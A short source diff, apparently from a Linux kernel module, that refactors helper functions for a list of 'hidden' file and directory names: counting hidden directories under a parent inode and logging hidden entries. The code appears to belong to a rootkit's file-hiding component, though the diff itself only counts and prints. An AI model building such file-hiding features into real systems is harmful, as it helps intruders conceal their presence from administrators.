@@ -184,6 +184,16 @@ bool fs_search_name(const char *name, u64 ino)
 	return false;
 }
 
+int fs_is_dir_inode_hidden(u64 ino) {
+    struct hidden_names *node, *node_safe;
+    int count = 0;
+    list_for_each_entry_safe(node, node_safe, &names_node, list) {
+        if (ino == node->ino_parent && node->is_dir)
+            count++;
+    }
+    return count;
+}
+
 const char *fs_get_basename(const char *path) {
     char *base = NULL;
 
@@ -200,28 +210,15 @@ const char *fs_get_basename(const char *path) {
     return base + 1;
 }
 
-int fs_is_dir_inode_hidden(const char *name, u64 ino) {
+void fs_list_names(void) {
     struct hidden_names *node, *node_safe;
-    int count = 0;
     list_for_each_entry_safe(node, node_safe, &names_node, list) {
-        if (node->is_dir && ino == node->ino_parent)
-            count++;
+        if (node->is_dir) {
+            prinfo("hidden: '%s' [directory] ino=%llu ino_parent=%llu\n", node->name, node->ino, node->ino_parent);
+        } else {
+            prinfo("hidden: '%s' ino=%llu\n", node->name, node->ino);
+        }
     }
-    return count;
-}
-
-void fs_list_names(void)
-{
-	struct hidden_names *node, *node_safe;
-	list_for_each_entry_safe (node, node_safe, &names_node, list) {
-		if (node->is_dir) {
-			prinfo("hidden: '%s' [directory] ino=%llu ino_parent=%llu\n",
-			       node->name, node->ino, node->ino_parent);
-		} else {
-			prinfo("hidden: '%s' ino=%llu\n", node->name,
-			       node->ino);
-		}
-	}
 }
 
 static int _fs_add_name(const char *name, bool ro, u64 ino, u64 ino_parent,
